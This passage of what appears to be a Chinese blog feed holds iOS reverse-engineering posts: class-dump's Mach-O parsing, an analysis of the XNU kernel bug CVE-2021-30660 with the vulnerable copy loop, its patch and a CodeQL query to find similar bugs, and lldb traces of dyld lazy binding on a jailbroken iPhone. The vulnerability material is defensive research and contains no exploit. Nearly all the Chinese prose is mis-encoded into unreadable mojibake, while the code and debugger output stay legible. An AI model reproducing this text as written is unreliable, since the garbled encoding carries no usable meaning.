æ‰€ä»¥protocolså°±éƒ½å¤„ç†å‡ºæ¥äº†ï¼Œæœ€åå¾—åˆ°äº† _protocolsByAddress __NSDictionaryM * 6781 key/value pairs 0x0000000112f93820 4. protocolUniquer createUniquedProtocolsä¾èµ–3ä¸­æ‰¾åˆ°çš„ _protocolsByAddress name -&gt; protocol å¯¹åº”å…³ç³»çš„dict addr -&gt; protocol å¯¹åº”å…³ç³»çš„dict p1-&gt;protocols é‡Œè¿˜æœ‰protocolï¼Œmergeè¿›æ¥(adopted protocols) p1 : _name __NSCFString * @â€AWEFriendsActivityWidgetConfigurationIntentHandlingâ€ 0x0000000112fbc710 p2 : _name NSTaggedPointerString * @â€NSObjectâ€ 0x07518ee6ed78d7f9 @interface AWEFriendsActivityWidgetConfigurationIntentHandling : NSObject { //blablablaâ€¦ } è¿™ç§æƒ…å†µ 5. loadClassesè§£æsection ï¼š __DATA __objc_classlist å’Œ3ç±»ä¼¼çš„å¥—è·¯ï¼Œå…ˆå¾—åˆ° ä¸€ä¸ª åœ°å€ï¼Œç„¶åæ ¹æ®åœ°å€ï¼Œå»æ–‡ä»¶ä¸­ç´¢å¼•å¯¹åº”çš„ç»“æ„ï¼š CDOCClass *aClass = [self loadClassAtAddress:val] åªè°ƒè¯•ä¸€æ¬¡è¿‡ç¨‹åˆ†æå³å¯: val uint64_t 4335166480 In [2]: hex(4335166480) Out[2]: '0x102656410' è¿™ä¸ª0x102656410ï¼Œä½¿ç”¨machoviewä¹Ÿèƒ½çœ‹åˆ°ï¼Œè°ƒè¯•+machoviewå¯¹æ¯”çœ‹ï¼Œæ›´å®¹æ˜“ç†è§£ã€‚ loadClassAtAddressæ–¹æ³•åˆ†æï¼š 123456789struct cd_objc2_class objc2Class;objc2Class.isa = [cursor readPtr];objc2Class.superclass = [cursor readPtr];objc2Class.cache = [cursor readPtr];objc2Class.vtable = [cursor readPtr];objc2Class.data = [cursor readPtr];objc2Class.reserved1 = [cursor readPtr];objc2Class.reserved2 = [cursor readPtr];objc2Class.reserved3 = [cursor readPtr]; ä¹Ÿæ˜¯è¯»å–å¯¹åº”çš„classç»“æ„ï¼Œè¿™ä¸ªè¿‡ç¨‹å…¶å®å¾ˆçœ¼ç†Ÿï¼Œå¦‚æœè¯»è¿‡iOSé€†å‘çš„ä¹¦ï¼Œæ¯”å¦‚åº†ç¥çš„ä¹¦ï¼Œæœ‰ä¸€ç« ä»‹ç»ocæ–¹æ³•è°ƒç”¨è¿‡ç¨‹çš„ï¼Œä¼šæŠŠoc-&gt;cppä»£ç ï¼Œé‚£é‡Œé¢è¿™ä¸ª oc objectçš„ç»“æ„åˆ†æçš„å¾ˆæ¸…æ¥šã€‚ ç„¶åè§£æ class-&gt;data å­—æ®µ 12345678910111213141516struct cd_objc2_class_ro_t objc2ClassData;objc2ClassData.flags = [cursor readInt32];objc2ClassData.instanceStart = [cursor readInt32];objc2ClassData.instanceSize = [cursor readInt32];if ([self.machOFile uses64BitABI]) objc2ClassData.reserved = [cursor readInt32];else objc2ClassData.reserved = 0;objc2ClassData.ivarLayout = [cursor readPtr];objc2ClassData.name = [cursor readPtr];objc2ClassData.baseMethods = [cursor readPtr];objc2ClassData.baseProtocols = [cursor readPtr];objc2ClassData.ivars = [cursor readPtr];objc2ClassData.weakIvarLayout = [cursor readPtr];objc2ClassData.baseProperties = [cursor readPtr]; ç„¶åå¾—åˆ°class çš„ nameï¼Œmethodsï¼Œprotocol, propertyä¿¡æ¯ ç„¶åè¿”å›è¿™ä¸ªclass å±•å¼€è¯´ä¸‹ è·å– methods &amp;&amp; propertyçš„æ—¶å€™ (NSArray *)loadMethodsAtAddress:(uint64_t)address; { return [self loadMethodsAtAddress:address extendedMethodTypesCursor:nil]; } loadMethodsAtAddress : 12345objc2Method.name = [cursor readPtr];objc2Method.types = [cursor readPtr];objc2Method.imp = [cursor readPtr];NSString *name = [self.machOFile stringAtAddress:objc2Method.name];NSString *types = [self.machOFile stringAtAddress:objc2Method.types]; ä¸€æ ·çš„å¥—è·¯ï¼Œéƒ½æ˜¯è§£æå‡ºæ¥å¯¹åº”çš„å­—æ®µï¼Œç„¶åæŒ‰ç…§è¿™äº›å­—æ®µè¯»å–ä¿¡æ¯(string) CDOCMethod *method = [[CDOCMethod alloc] initWithName:name typeString:types address:objc2Method.imp]; [methods addObject:method]; æœ€åè·å¾—methodsæ•°ç»„ï¼Œç»™å‰é¢å¡«å……classçš„åœ°æ–¹ä½¿ç”¨ loadIvarsAtAddress ,loadPropertiesAtAddress , loadMethodsOfMetaClassAtAddress åŒç† è‡³æ­¤ï¼Œclassè§£æå®Œæ¯• 6. loadCategorieså…³äºCategories å¯ä»¥çœ‹ https://zhuanlan.zhihu.com/p/24925196 å¤„ç† __DATA __objc_catlist section : (CDOCCategory *)loadCategoryAtAddress:(uint64_t)address; ä¸€æ ·çš„å¤„ç†æ–¹æ³• 123456789struct cd_objc2_category objc2Category;objc2Category.name = [cursor readPtr];objc2Category.class = [cursor readPtr];objc2Category.instanceMethods = [cursor readPtr];objc2Category.classMethods = [cursor readPtr];objc2Category.protocols = [cursor readPtr];objc2Category.instanceProperties = [cursor readPtr];objc2Category.v7 = [cursor readPtr];objc2Category.v8 = [cursor readPtr]; å¯ä»¥çœ‹åˆ°å’Œå¯¹objc2Classçš„å¤„ç†æœ‰ç‚¹åƒï¼Œå°±æ˜¯å› ä¸ºæ˜¯categoryçš„åŸå› ï¼Œæ‰€ä»¥å­—æ®µæœ‰ä¸åŒï¼Œ ç®€å•çš„ç†è§£æˆ å¤„ç†ä¸€ç§ç‰¹æ®Šçš„classï¼Œå¹¶ä¸”æå–å‡ºç›¸åº”çš„ methods å’Œ propertieså°±è¡Œ è‡³æ­¤æ•´ä¸ª processå‡½æ•°çš„å¤„ç†ç»“æŸ 7. å¤„ç† or è¾“å‡ºè¿™éƒ¨åˆ†ä¸»è¦æ˜¯å¤„ç†è¾“å‡ºäº†ï¼Œå¦‚æœæ²¡ä»€ä¹ˆå‚æ•°å°±ç›´æ¥stdoutè¾“å‡ºï¼Œå¦‚æœæœ‰æŒ‡å®šæ–‡ä»¶ç›®å½•ï¼Œå°±éå†ä¹‹å‰processå¾—åˆ°çš„ä¿¡æ¯ï¼Œå†™æ–‡ä»¶(.h)åˆ°æŒ‡å®šçš„ç›®å½•ã€‚ Referencehttps://zhuanlan.zhihu.com/p/24925196 https://en.wikipedia.org/wiki/Mach-O https://iosre.com/ https://evilpan.com/2020/09/06/macho-inside-out/ iOSåº”ç”¨é€†å‘ä¸å®‰å…¨ (åˆ˜åŸ¹åº†è‘—)","link":"/2021/07/11/iOS-RE-4-beginners-1/"},{"title":"ql query for CVE-2021-30660 XNU Kernel Memory Disclosure","text":"CVE-2021-30660 - XNU Kernel Memory Disclosure Vulnmsgsz å¯æ§ msginfo.msgssz æ˜¯ 8 å¦‚æœæ§åˆ¶ msgsz ä¸æ˜¯ 8çš„ æ•´æ•°å€ï¼Œæ¯”å¦‚9ï¼Œå°±ä¼šå¯¼è‡´åœ¨ç¬¬äºŒæ¬¡å¾ªç¯çš„æ—¶å€™ leakå‡ºæ¥ 7å­—èŠ‚çš„å†…æ ¸æ•°æ®ã€‚ 1234567891011121314151617181920212223242526272829303132next = msghdr-&gt;msg_spot; for (len = 0; len &lt; msgsz; len += msginfo.msgssz) { size_t tlen; /* compare input (size_t) value against restrict (int) value */ if (msgsz &gt; (size_t)msginfo.msgssz) { tlen = msginfo.msgssz; } else { tlen = msgsz; } if (next &lt;= -1) { panic(\"next too low #3\"); } if (next &gt;= msginfo.msgseg) { panic(\"next out of range #3\"); } SYSV_MSG_SUBSYS_UNLOCK(); eval = copyout(&amp;msgpool[next * msginfo.msgssz], user_msgp, tlen); SYSV_MSG_SUBSYS_LOCK(); if (eval != 0) {#ifdef MSG_DEBUG_OK printf(\"error (%d) copying out message segment\\\\n\", eval);#endif msg_freehdr(msghdr); wakeup((caddr_t)msqptr); goto msgrcvout; } user_msgp = user_msgp + tlen; /* ptr math */ next = msgmaps[next].next; } Patch1234567891011121314151617for (len = 0; len &lt; msgsz; len += msginfo.msgssz) { size_t tlen; /* * copy the full segment, or less if we're at the end * of the message */ tlen = MIN(msgsz - len, (size_t)msginfo.msgssz); if (next &lt;= -1) { panic(\"next too low #3\"); } if (next &gt;= msginfo.msgseg) { panic(\"next out of range #3\"); } SYSV_MSG_SUBSYS_UNLOCK(); eval = copyout(&amp;msgpool[next * msginfo.msgssz], user_msgp, tlen); è¡¥ä¸ä¿è¯äº†ï¼Œåœ¨é8 æ•´æ•°å€çš„æ—¶å€™ï¼Œåªæ‹·è´å‰©ä½™çš„é•¿åº¦çš„æ•°æ®ã€‚ CodeQL query1234567891011121314151617181920212223242526272829303132333435363738394041424344import cppimport semmle.code.cpp.dataflow.TaintTrackingimport DataFlow::PathGraph// å­˜åœ¨è¯¯æŠ¥ IOKitpredicate isSYSCall(Function f) { exists(Macro m | m.getName().toUpperCase().regexpMatch(\"SYS(.)*\") and m.getLocation().getFile().getBaseName() = \"syscall.h\" and m.getName().indexOf(f.getName()) &gt; 0 )}/*syscall -&gt; copyoutsource : syscall fucntion 's paramssink : copyout 3rd param(size)*/class Config extends TaintTracking::Configuration { Config() { this = \"taint size to copy size\" } override predicate isSource(DataFlow::Node source) { exists(LocalVariable lv, Function f | isSYSCall(f) and lv.getFunction() = f and ( not source.asExpr().(Literal).isConstant() ) and lv.getAnAccess() = source.asExpr() ) } override predicate isSink(DataFlow::Node sink) { exists (FunctionCall fc | fc.getTarget().getName() = \"copyout\" and fc.getArgument(2) = sink.asExpr() ) }}from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sinkwhere cfg.hasFlowPath(source, sink)select source, \" to \", sink, \" in \", source.getNode().getFunction().getName() æœ‰è¯¯æŠ¥ï¼Œä½†æ˜¯å¤Ÿç”¨äº†ï¼Œæ›¿æ¢æˆcopyinï¼Œä¹Ÿå¯ä»¥çœ‹çœ‹å…¶ä»–çš„è°ƒç”¨è·¯å¾„ï¼Œä¸è¿‡ç¬”è€…æ²¡å‘ç°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿ : ( referenceCVE-2021-30660 - XNU Kernel Memory Disclosure","link":"/2021/07/11/ql-query-for-CVE-2021-30660-XNU-Kernel-Memory-Disclosure/"},{"title":"iOS RE 4 beginners 2 - é™æ€é“¾æ¥&amp;&amp;åŠ¨æ€é“¾æ¥","text":"ENVmacos11.4 + iphone6 iOS 12.2 é™æ€é“¾æ¥é™æ€é“¾æ¥ï¼šè¾“å…¥å¤šä¸ªç›®æ ‡æ–‡ä»¶ï¼Œè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ï¼ˆä¸€èˆ¬æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒæŠŠå¤šä¸ªç›®æ ‡æ–‡ä»¶é‡Œç›¸åŒæ€§è´¨çš„æ®µåˆå¹¶åˆ°ä¸€èµ·ã€‚ è¿‡ç¨‹ åœ°å€å’Œç©ºé—´åˆ†é… (Address and Storage Allocation) ç¬¦å·å†³è®® (Symbol Resolution) / ç¬¦å·ç»‘å®š (Symbol Binding) é‡å®šä½ (Relocation) æºç 123456789101112131415161718~/study/ios_re_link/static_link î‚° cat main.cextern int global_var;int foo(int i);int main(void){ int ret = foo(42 + global_var); return 0;} ~/study/ios_re_link/static_link î‚° cat foo.cint global_var = 0x1337;int foo(int i){ return i + global_var;} 12~/study/ios_re_link/static_link î‚° xcrun -sdk iphoneos clang -c main.c foo.c -target arm64-apple-ios12.2~/study/ios_re_link/static_link î‚° xcrun -sdk iphoneos clang main.o foo.o -o main -target arm64-apple-ios12.2 ä¸¤ä¸ªæ¨¡å—(main.o å’Œ foo.o) é€šè¿‡é™æ€é“¾æ¥ç»„åˆæˆäº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶(main) æ¨¡å—&amp;&amp;äº§ç‰©main.oé€šè¿‡machoviewå¯ä»¥çœ‹åˆ°é‡å®šä½æ®µæœ‰ä¸‰æ¡ä¿¡æ¯ï¼Œæ„å‘³ç€ç¨‹åºä¸­æœ‰ä¸‰å¤„éœ€è¦é‡å®šä½å¤„ç†ï¼š è¿™ä¸ªå›¾æ˜¯hopperåæ±‡ç¼–çš„mainå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å¯¹äºå¼•ç”¨åˆ°å…¶ä»–æ¨¡å—(foo.o)é‡çš„å˜é‡/å‡½æ•°çš„åœ°æ–¹çœ‹èµ·æ¥â€œæ­£å¸¸â€ï¼Œä½†æ˜¯ç‚¹å‡» bl _foo å°±ä¼šå‘ç°è·³è½¬åˆ°äº†ï¼š æ ¹æ®&lt;macho/reloc.h&gt;çš„å®šä¹‰ï¼Œå¯ä»¥çœ‹åˆ°relocæ®µçš„ç»“æ„ï¼š 12345678910struct relocation_info { int32_t r_address; /* offset in the section to what is being relocated */ uint32_t r_symbolnum:24, /* symbol index if r_extern == 1 or section ordinal if r_extern == 0 */ r_pcrel:1, /* was relocated pc relative already */ r_length:2, /* 0=byte, 1=word, 2=long, 3=quad */ r_extern:1, /* does not include value of sym referenced */ r_type:4; /* if not 0, machine specific relocation type */}; ç»“åˆä¸Šé¢çš„å›¾æ¥çœ‹(ä»¥_fooç¬¦å·ä¸ºä¾‹)ï¼š r_address : 0x28 r_symbolnum(24bits): æŒ‡å‘_foo å­—ç¬¦ä¸² å‰©ä¸‹çš„8bitsæ˜¯æ ‡å¿—ä½ å¯¹åº”åˆ°æ±‡ç¼–é‡Œå°±æ˜¯ï¼Œmainå‡½æ•°çš„0x28è¡Œå¼•ç”¨äº† _foo ç¬¦å·ï¼Œrelocæ®µæŠŠè¿™ä¸ªä¿¡æ¯å‘ŠçŸ¥linkerï¼Œè¿™æ ·åœ¨é“¾æ¥çš„æ—¶å€™linkerå°±ä¼šå¤„ç†è¿™æ¡ä¿¡æ¯ï¼ŒæŠŠå¯¹åº”çš„ç¬¦å·åšæ›¿æ¢å¤„ç†ã€‚ foo.o å…¶å®éƒ½æ˜¯å¯¹ global_varçš„å¼•ç”¨ åœ¨foo.oæ¨¡å—ä¸­ï¼Œæ˜¯ 0x20å¤„çš„dataï¼Œè¿™ä¸ªä¿¡æ¯ä¹Ÿè¦å‘Šè¯‰linkerï¼Œåœ¨linkçš„é˜¶æ®µåšæ›¿æ¢ã€‚ mainæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶mainï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰é‡å®šä½ä¿¡æ¯ï¼Œè€Œä¸”mianå’Œfooå‡½æ•°ä¸­æ”¹æ›¿æ¢çš„ç¬¦å·éƒ½å·²ç»å®Œæˆäº†æ›¿æ¢ï¼Œå¯ä»¥é¡ºåˆ©çš„ç´¢å¼•åˆ°æƒ³è¦ä½¿ç”¨çš„ç¬¦å·(fooå’Œglobal_var)ã€‚ å¯¹æ¯”ä¸¤è€…ç¬¦å·è¡¨ï¼š ä»¥fooç¬¦å·ä¸ºä¾‹ : Type ä» N_UNDF â†’ NSECT Value ä»0 â†’ 0x100007f90 ç¬¦å·è¡¨ç»“æ„: 123456789struct nlist_64 { union { uint32_t n_strx; /* index into the string table */ } n_un; uint8_t n_type; /* type flag, see below */ uint8_t n_sect; /* section number or NO_SECT */ uint16_t n_desc; /* see &lt;mach-o/stab.h&gt; */ uint64_t n_value; /* value of this symbol (or stab offset) */}; foo ç¬¦å·çš„è¯ string table index : æŒ‡å‘ç¬¦å·çš„å­—ç¬¦ä¸² n_sect : æ”¹ç¬¦å·åœ¨ç¬¬å‡ ä¸ªsection n_value : ç¬¦å·å…·ä½“å€¼(åœ°å€) ä¸¾ä¸ªğŸŒ°è¿™é‡Œä»¥demoä¸­ global_var ä½¿ç”¨çš„ä»£ç ä¸¾ä¾‹å­ã€‚ æºç ä¸­: 1int ret = foo(42 + global_var); å¦‚æœå¯¹åº”åˆ°æ±‡ç¼–é‡Œåº”è¯¥æ˜¯: 12345670000000000000014 adrp x9, #0x0 ; 0x68@PAGE0000000000000018 ldr x9, [x9, #0x68] ; 0x68@PAGEOFF000000000000001c ldr w10, [x9]0000000000000020 add w0, w10, #0x2a0000000000000024 str w8, [sp, #0x10 + var_C]0000000000000028 bl _foo å¯çŸ¥ w0 æ˜¯å‚æ•°ï¼Œw10æ˜¯global_varçš„å€¼ï¼Œæ¥è‡ªx9 w10 = [x9 + 0x68] (æœªé‡å®šä½ä¿®å¤ï¼‰ æœ€å¼€å§‹ç´¢å¼•x9çš„æ—¶å€™å¯ä»¥å‘ç°æ˜¯æŠŠ0èµ‹ç»™äº†x9ï¼Œå› ä¸ºè¿™é‡Œè¿˜æ²¡æœ‰é‡å®šä½ï¼Œæ‰€ä»¥ç”¨0ä»£æ›¿ã€‚ æœ€ç»ˆçš„äº§ç‰©ä¸­å¯ä»¥çœ‹åˆ°ï¼š 1234560000000100007f64 adrp x9, #0x100008000 ; 0x100008000@PAGE0000000100007f68 add x9, x9, #0x0 ; 0x100008000@PAGEOFF, _global_var0000000100007f6c ldr w10, [x9] ; _global_var0000000100007f70 add w0, w10, #0x2a0000000100007f74 str w8, [sp, #0x10 + var_C]0000000100007f78 bl _foo æŠŠ0æ›¿æ¢æˆäº† 0x100008000ï¼Œè¿™ä¸ªåœ°å€æ°å¥½æŒ‡å‘global_varã€‚ å¯ä»¥çœ‹åˆ°ç»è¿‡linkerçš„å¤„ç†ï¼Œå¯ä»¥æ­£ç¡®æ‰¾åˆ°global_varï¼Œç¬¦å·fooåŒç† åŠ¨æ€é“¾æ¥debug set up åº”è¯¥æ˜¯ç­¾åæœ‰é—®é¢˜ï¼Œæœ€ç»ˆè§£å†³æ–¹æ¡ˆï¼š 1234567891011/usr/bin/security find-identity -v -p codesigning# get : A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455codesign -s \"A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455\" --entitlements entitlements.xml -f libFoo.dylibcodesign -s \"A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455\" --entitlements entitlements.xml -f main# scp ....# ssh ....mude-iPhone:/tmp root# ./mainmagic is : 49194920 debug lazy binding process å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ printfçš„æ—¶å€™ï¼Œblè·³è¿‡å»å¹¶ä¸æ˜¯ printfå‡½æ•° 12345678910111213141516Target 0: (main) stopped.(lldb) sProcess 1453 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into frame #0: 0x000000010089bf7c main-&gt; 0x10089bf7c: br x16 0x10089bf80: ldr w16, 0x10089bf88 0x10089bf84: b 0x10089bf68 0x10089bf88: udf #0x0Target 0: (main) stopped.(lldb) re re x16 x16 = 0x00000001d858080c libdyld.dylib`dyld_stub_binder(lldb) re re x0 x0 = 0x000000010089bfa4 &quot;magic is : %d\\n&quot;(lldb) re re x1 x1 = 0x0000000000001337 é€šè¿‡ dyld_stub_binder æ‰¾ printfçš„åœ°å€ï¼ŒæŠŠæ‰¾åˆ°çš„åœ°å€å†™å›åˆ° DATA,__la_symbol_ptr ç¬¬äºŒæ¬¡è°ƒç”¨printfçš„æ—¶å€™å°±å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªåœ°æ–¹printfå‡½æ•°åœ°å€å·²ç»è¢«å†™è¿‡æ¥äº† 123456789101112131415161718(lldb) x/10i $pc-&gt; 0x100dcff60: 0x58000610 ldr x16, #0xc0 ; (void *)0x00000001d860e14c: printf 0x100dcff64: 0xd61f0200 br x16 0x100dcff68: 0x10000611 adr x17, #0xc0 ; _dyld_private 0x100dcff6c: 0xd503201f nop 0x100dcff70: 0xa9bf47f0 stp x16, x17, [sp, #-0x10]! 0x100dcff74: 0xd503201f nop 0x100dcff78: 0x58000490 ldr x16, #0x90 ; (void *)0x00000001d858080c: dyld_stub_binder 0x100dcff7c: 0xd61f0200 br x16 0x100dcff80: 0x18000050 ldr w16, 0x100dcff88 0x100dcff84: 0x17fffff9 b 0x100dcff68(lldb) x/3i $pc-&gt; 0x100dcff60: 0x58000610 ldr x16, #0xc0 ; (void *)0x00000001d860e14c: printf 0x100dcff64: 0xd61f0200 br x16 0x100dcff68: 0x10000611 adr x17, #0xc0 ; _dyld_private(lldb) x/gx $pc+0xc00x100dd0020: 0x00000001d860e14c(lldb) memory region 0x00000001d860e14c æ‰€ä»¥è¿™é‡Œå°±å¯ä»¥ç›´æ¥è·å–åˆ°åœ°å€ï¼Œç„¶åç›´æ¥è·³è½¬è¿‡å»å°±è¡Œ: 1234567891011121314151617181920212223(lldb) sProcess 1453 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into frame #0: 0x000000010089bf60 main`printf + 4main`printf:-&gt; 0x10089bf60 &lt;+4&gt;: ldr x16, #0xc0 ; (void *)0x00000001d860e14c: printf 0x10089bf64 &lt;+8&gt;: br x16 0x10089bf68: adr x17, #0xc0 ; _dyld_private 0x10089bf6c: nopTarget 0: (main) stopped.(lldb) sProcess 1453 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into frame #0: 0x000000010089bf64 main`printf + 8main`printf:-&gt; 0x10089bf64 &lt;+8&gt;: br x16 0x10089bf68: adr x17, #0xc0 ; _dyld_private 0x10089bf6c: nop 0x10089bf70: stp x16, x17, [sp, #-0x10]!Target 0: (main) stopped.(lldb) re re x16 x16 = 0x00000001d860e14c libsystem_c.dylib`printf(lldb) libdyld.dylib`dyld_stub_binderdyld-852çš„ä»£ç ï¼š å› ä¸ºæˆ‘ç›®æ ‡ç¯å¢ƒæ˜¯iOS12.2ï¼Œæ‰€ä»¥å…·ä½“æ±‡ç¼–ä»£ç æœ‰ä¸€äº›å·®åˆ«ï¼š 1234567891011121314151617181920212223242526272829303132Target 0: (main) stopped.(lldb) x/30i $pc-&gt; 0x1d858080c: 0xa9bf7bfd stp x29, x30, [sp, #-0x10]! 0x1d8580810: 0x910003fd mov x29, sp 0x1d8580814: 0xd103c3ff sub sp, sp, #0xf0 ; =0xf0 0x1d8580818: 0xa93f07a0 stp x0, x1, [x29, #-0x10] 0x1d858081c: 0xa93e0fa2 stp x2, x3, [x29, #-0x20] 0x1d8580820: 0xa93d17a4 stp x4, x5, [x29, #-0x30] 0x1d8580824: 0xa93c1fa6 stp x6, x7, [x29, #-0x40] 0x1d8580828: 0xa93b27a8 stp x8, x9, [x29, #-0x50] 0x1d858082c: 0xad3c07a0 stp q0, q1, [x29, #-0x80] 0x1d8580830: 0xad3b0fa2 stp q2, q3, [x29, #-0xa0] 0x1d8580834: 0xad3a17a4 stp q4, q5, [x29, #-0xc0] 0x1d8580838: 0xad391fa6 stp q6, q7, [x29, #-0xe0] 0x1d858083c: 0xf9400fa0 ldr x0, [x29, #0x18] 0x1d8580840: 0xf9400ba1 ldr x1, [x29, #0x10] 0x1d8580844: 0x940004e4 bl 0x1d8581bd4 ; _dyld_fast_stub_entry(void*, long) 0x1d8580848: 0xaa0003f0 mov x16, x0 0x1d858084c: 0xa97f07a0 ldp x0, x1, [x29, #-0x10] 0x1d8580850: 0xa97e0fa2 ldp x2, x3, [x29, #-0x20] 0x1d8580854: 0xa97d17a4 ldp x4, x5, [x29, #-0x30] 0x1d8580858: 0xa97c1fa6 ldp x6, x7, [x29, #-0x40] 0x1d858085c: 0xa97b27a8 ldp x8, x9, [x29, #-0x50] 0x1d8580860: 0xad7c07a0 ldp q0, q1, [x29, #-0x80] 0x1d8580864: 0xad7b0fa2 ldp q2, q3, [x29, #-0xa0] 0x1d8580868: 0xad7a17a4 ldp q4, q5, [x29, #-0xc0] 0x1d858086c: 0xad791fa6 ldp q6, q7, [x29, #-0xe0] 0x1d8580870: 0x910003bf mov sp, x29 0x1d8580874: 0xa8c17bfd ldp x29, x30, [sp], #0x10 0x1d8580878: 0x910043ff add sp, sp, #0x10 ; =0x10 0x1d858087c: 0xd61f0200 br x16 0x1d8580880: 0xd10103ff sub sp, sp, #0x40 ; =0x40 ä½†æ˜¯æœ¬è´¨ä¸Šæ˜¯å·®ä¸å¤šçš„ï¼Œå½±å“ä¸å¤§ã€‚ ä¸‹é¢çœ‹çœ‹æ€ä¹ˆä¸€æ­¥ä¸€æ­¥è°ƒç”¨è¿›å»ï¼Œæ‰¾åˆ°æ‰€éœ€è¦çš„ç¬¦å· 1. call dyld_stub_binder1234567891011121314150000000100007f98 ldr w16, =0x6967616d0000001a0000000100007f9c b 0x100007f68....0000000100007f68 adr x17, #0x100008028 ; CODE XREF=0x100007f84, 0x100007f90, 0x100007f9c// x17-&gt; _dyld_private0000000100007f6c nop0000000100007f70 stp x16, x17, [sp, #-0x10]!0000000100007f74 nop0000000100007f78 ldr x16, #dyld_stub_binder_1000080080000000100007f7c br x16 // call dyld_stub_binder ä¸ªäººçŒœæµ‹ï¼š0x000000000000001a åº”è¯¥æ˜¯ ç±»ä¼¼ linuxä¸‹elf lazy bindingçš„æ—¶å€™é‚£ä¸ªindexå‚æ•°çš„ä¸œè¥¿ï¼Œæ¯ä¸ªç¬¦å·éƒ½ä¸ä¸€æ · ã€‚ åˆå§‹åŒ–å¥½éœ€è¦çš„å‚æ•°å°±è°ƒç”¨è¿›å»dyldä¸­å»åšç¬¦å·ç»‘å®šæ“ä½œäº† 1234567891011121314151617181920212223(lldb) sProcess 1465 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into frame #0: 0x0000000100fb7f7c main-&gt; 0x100fb7f7c: br x16 0x100fb7f80: ldr w16, 0x100fb7f88 0x100fb7f84: b 0x100fb7f68 0x100fb7f88: udf #0x0Target 0: (main) stopped.(lldb) re re x16 x16 = 0x00000001d858080c libdyld.dylib`dyld_stub_binder(lldb) x/10gx $sp0x16ee4f5a0: 0x000000000000001a 0x0000000100fb80280x16ee4f5b0: 0x0000000000001337 0x00000000000000000x16ee4f5c0: 0x0000000000000000 0x00000000000000010x16ee4f5d0: 0x000000016ee4f5f0 0x00000001d857e8e00x16ee4f5e0: 0x00000001d857e8e0 0x0000000000000000(lldb) re re x0 x0 = 0x0000000100fb7fa4 \"magic is : %d\\n\"(lldb) re re x1 x1 = 0x0000000000001337(lldb) re re x2 x2 = 0x00000000000120a8 2. call dyld::fastBindLazySymbol(loadercache, lazyinfo)ä¿å­˜æ ˆå¸§ï¼Œä¿å­˜å½“å‰çš„å¯„å­˜å™¨ä¿¡æ¯(ä¸€å¤§å †stpæŒ‡ä»¤ï¼Œåé¢ç¬¦å·ç»‘å®šå®Œæˆåï¼Œldpä¼šæ¢å¤ï¼Œè¿™äº›æ˜¯æˆå¯¹çš„)ï¼Œç„¶åè®¾ç½®å¥½å‚æ•°ï¼Œå°±ç›´æ¥è½¬åˆ° dyld::fastBindLazySymbol ï¼ˆå‡½æ•°å‰é¢çš„ä¿å­˜æ“ä½œçœ‹èµ·æ¥å’Œx86ä¸Šå‡½æ•°å¼€å¤´çš„ä¿å­˜æ ˆå¸§ æŠ¬é«˜æ ˆçµ¦ä¸´æ—¶å˜é‡é¢„ç•™ç©ºé—´çš„æ“ä½œå·®ä¸å¤šï¼‰ 1234567891011121314Process 1465 resumingProcess 1465 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 3.1 frame #0: 0x00000001d8580844 libdyld.dylib`dyld_stub_binder + 56libdyld.dylib`dyld_stub_binder:-&gt; 0x1d8580844 &lt;+56&gt;: bl 0x1d8581bd4 ; _dyld_fast_stub_entry(void*, long) 0x1d8580848 &lt;+60&gt;: mov x16, x0 0x1d858084c &lt;+64&gt;: ldp x0, x1, [x29, #-0x10] 0x1d8580850 &lt;+68&gt;: ldp x2, x3, [x29, #-0x20]Target 0: (main) stopped.(lldb) re re x0 x0 = 0x0000000100fb8028 _dyld_private(lldb) re re x1 x1 = 0x000000000000001a è°ƒç”¨çš„æ˜¯ : fastBindLazySymbol(0x0000000100fb8028, 0x1a) 1234567891011// LINK_EDIT segconst uint8_t* const start = fLinkEditBase + fDyldInfo-&gt;lazy_bind_off;const uint8_t* const end = &amp;start[fDyldInfo-&gt;lazy_bind_size];// ....do{ if ( ! getLazyBindingInfo(lazyBindingInfoOffset, start, end, &amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind) ) dyld::throwf(\"bad lazy bind info\");}while (!doneAfterBind &amp;&amp; !context.strictMachORequired); å¯¹åº”æ±‡ç¼–ä¸­ï¼š 12345678910111213141516171819(lldb) cProcess 1465 resumingProcess 1465 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 4.1 frame #0: 0x0000000100fe5e6c dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(unsigned int, ImageLoader::LinkContext const&amp;, void (*)(), void (*)()) + 136dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:-&gt; 0x100fe5e6c &lt;+136&gt;: bl 0x100fe1d98 ; ImageLoaderMachO::getLazyBindingInfo(unsigned int&amp;, unsigned char const*, unsigned char const*, unsigned char*, unsigned long*, int*, char const**, bool*) 0x100fe5e70 &lt;+140&gt;: tbz w0, #0x0, 0x100fe5f80 ; &lt;+412&gt; 0x100fe5e74 &lt;+144&gt;: ldrb w1, [sp, #0x43] 0x100fe5e78 &lt;+148&gt;: ldrb w8, [x20, #0x74]Target 0: (main) stopped.(lldb) re re x1 x1 = 0x0000000100fbc030(lldb) re re x2 x2 = 0x0000000100fbc058(lldb) memory region 0x0000000100fbc030[0x0000000100fbc000-0x0000000100fc0000) r-- __LINKEDIT(lldb) è¿™é‡Œç”¨åˆ°äº† æˆ‘è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„LINK_EDIT 